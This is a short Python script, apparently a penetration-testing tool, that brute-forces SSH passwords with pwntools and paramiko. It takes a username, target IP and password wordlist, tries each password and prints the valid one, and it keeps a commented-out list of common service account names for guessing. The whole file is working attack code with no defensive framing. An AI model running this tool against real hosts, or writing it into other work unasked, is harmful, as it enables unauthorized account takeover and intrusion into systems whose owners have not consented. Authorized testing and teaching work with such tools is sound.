#!/usr/local/bin/python3
from pwn import *
import paramiko
import sys

if len(sys.argv) != 4:
	print("\n")
	print("Invalid arguments!")
	print(">> {} <username> <ip-address> <path-to-wordlist>".format(sys.argv[0]))
	print("\n")
	exit()

# username = ["root", "test", "admin", "oracle", "user", "nagios", "guest", "postgres", "info", "mysql", "ubuntu", "kali", "adm", "administrator", "apache", "at", "backup", "bb", "bin", "cron", "daemon", "db2fenc1", "db2inst1", "Debian-exim", "ftp", "games", "gdm", "gnats", "halt", "irc", "list", "lp", "mail", "man", "named", "news", "nobody", "ntp", "operator", "oracle8", "portage", "postfix", "postmaster", "proxy", "public", "rpc", "rwhod", "shutdown", "smmsp", "smmta", "squid", "sshd", "sync", "sys", "system", "toor", "uucp", "websphere", "www-data"]
username = sys.argv[1]
host = sys.argv[2]
password_file = sys.argv[3]
attempts = 0

with open(password_file, "r") as password_list:
  for password in password_list:
  	password = password.strip("\n")
  	try:
  		print("[{}] Attempting password: '{}' !".format(attempts, password))
  		response = ssh(host=host, user=username, password=password, timeout=1)
  		if response.connected():
  			print("[>] Valid password found: '{}'!".format(password))
  			response.close()
  			break
  		response.close()
  	except paramiko.ssh_exception.AuthenticationException:
  		print("[X] Invalid password!")
  	except KeyboardInterrupt:
  		break
  	attempts +=1
